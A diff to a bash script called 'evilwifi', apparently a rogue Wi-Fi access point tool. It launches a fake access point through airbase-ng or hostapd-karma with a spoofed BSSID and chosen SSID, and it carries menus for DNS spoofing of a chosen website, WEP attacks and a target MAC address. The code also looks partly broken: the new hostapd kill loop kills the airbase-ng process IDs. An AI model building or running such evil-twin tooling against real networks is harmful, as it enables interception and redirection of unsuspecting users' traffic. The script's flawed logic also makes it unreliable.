@@ -29,6 +29,8 @@ initpath=`pwd`
 settings=evilwifi.conf
 sessionfolder=$folder/SESSION_$RANDOM
 LOG=$sessionfolder/evilwifi.log
+MAC=$(awk '/HWaddr/ { print $5 }' < <(ifconfig $ATHIFACE))
+TAPIFACE=at0
 if [ -d != $folder ]; then mkdir $folder 2> /dev/null; fi
 if [ -f $settings ]; then readconfig; fi
 mkdir $sessionfolder
@@ -49,9 +51,6 @@ echo "
 |B||Y| |H||A||C||K||E||R| |B||U||S||T||E||R||S| |C||A||N||A||D||A|
 +-++-+ +-++-++-++-++-++-+ +-++-++-++-++-++-++-+ +-++-++-++-++-++-+
 "
-}
-function readconfig(){
-MAC=$(awk '/HWaddr/ { print $5 }' < <(ifconfig $ATHIFACE))
 }
 OK=`printf "\e[1;32m OK \e[0m"`
 FAIL=`printf "\e[1;31mFAIL\e[0m"`
@@ -144,6 +143,7 @@ hostapd -f $sessionfolder/hostapd.log ~/hostapd-karma.conf -B
 function pspids(){
 pgrep airbase-ng > $sessionfolder/airbase-ng.pid
 pgrep dnsmasq > $sessionfolder/dnsmasq.pid
+pgrep hostapd > $sessionfolder/hostapd.pid
 }
 function stopshit(){
 pspids
@@ -152,13 +152,20 @@ service dhcp3-server stop &>$LOG
 while [ -s $sessionfolder/airbase-ng.pid ]; do
 sleep 2
 pspids
-echo "Killing Airbase-NG PIDs"
+echo "Killing Airbase-NG"
 kill `awk '{ print $1 }' < <(cat $sessionfolder/airbase-ng.pid)` &>/dev/null
+done
+while [ -s $sessionfolder/hostapd.pid ]; do
+sleep 2
+pspids
+echo "Killing Hostapd"
+kill -9 `awk '{ print $1 }' < <(cat $sessionfolder/airbase-ng.pid)` &>/dev/null
+airmon-ng stop mon.$TAPIFACE &>/dev/null
 done
 while [ -s $sessionfolder/dnsmasq.pid ]; do
 sleep 2
 pspids
-echo "Killing DNSMASQ PIDs"
+echo "Killing DNSMASQ"
 kill `awk '{ print $1 }' < <(cat $sessionfolder/dnsmasq.pid)` &>/dev/null
 done
 for pid in `ls $folder/*.pid 2>$LOG`; do if [ -s "$pid" ]; then
@@ -366,8 +373,6 @@ echo ""
 read -e -p "Option: " softap
 echo ""
 if [ "$softap" = "" ]; then clear; softapmenu; fi
-if [ "$softap" = "0" ]; then TAPIFACE=at0; fi
-if [ "$softap" = "1" ]; then TAPIFACE=$ATHIFACE; fi
 }
 function dhcpmenu(){
 echo "+===================================+"
@@ -401,6 +406,9 @@ echo "+===================================+"
 echo ""
 read -e -p "Option: " attack
 if [ "$attack" = "" ]; then clear; attackmenu; fi
+}
+function startairbase(){
+airbase-ng -a $MAC -c $CHAN -x $PPS -I $BEAINT -e "$ESSID" $OTHEROPTS $MONIFACE -P -C 15 -v > $folder/airbaseng.log &
 }
 function startdnsmasq(){
 echo "no-poll" >> /etc/dnsmasq.conf
@@ -845,8 +853,8 @@ read -e -p "What SSID Do You Want To Use [WiFi]: " ESSID
 if [ "$ESSID" = "" ]; then ESSID=WiFi; fi
 read -e -p "What CHANNEL Do You Want To Use [1]: " CHAN
 if [ "$CHAN" = "" ]; then CHAN=1; fi
-read -e -p "Select your MTU setting [1500]: " MTU
-if [ "$MTU" = "" ]; then MTU=1500; fi
+read -e -p "Select your MTU setting [7981]: " MTU
+if [ "$MTU" = "" ]; then MTU=7981; fi
 if [ "$MODE" = "4" ]; then 
 read -e -p "Targets MAC Address: " TARGETMAC
 fi
@@ -861,16 +869,16 @@ read -e -p "DNS Spoof What Website [#]: " DNSURL
 if [ "$DNSURL" = "" ]; then DNSURL=\#; fi
 fi
 echo ""
-monitormodestart
 if [ "$mode" = "4" ]; then wepattackmenu; fi
 echo "* STARTING ACCESS POINT: $ESSID *"
+echo "* WIRELESS IFACE: $TAPIFACE *"
 echo "* IP: $TAPIP *"
 echo "* BSSID: $MAC *"
 echo "* CHANNEL: $CHAN *"
 echo "* PACKETS PER SECOND: $PPS *"
 echo "* BEACON INTERVAL: $BEAINT *"
-#airbase-ng -a $MAC -c $CHAN -x $PPS -I $BEAINT -e "$ESSID" $OTHEROPTS $MONIFACE -P -C 15 -v > $folder/airbaseng.log &
-hostapdkarma
+if [ "$softap" = "0" ]; then monitormodestart; startairbase; fi
+if [ "$softap" = "1" ]; then hostapdkarma; fi
 sleep 2
 if [ "$mode" != "2" ]; then
 ifconfig $TAPIFACE up
